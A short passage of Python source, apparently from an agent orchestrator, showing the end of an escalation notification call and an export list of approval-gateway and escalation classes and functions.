                "session_id": request.session_id,
                "run_id": request.run_id,
                "source": "orchestrator",
                "reason": reason,
                "trigger": _reason_trigger(reason),
            },
            db_path=self._db_path,
            push=self._push,
        )


__all__ = [
    "ESCALATION_DELIVERY_FAILED",
    "ApprovalGateway",
    "NotificationEscalator",
    "classify_hard_stop",
    "classify_target_scope",
    "resolve_approval",
]
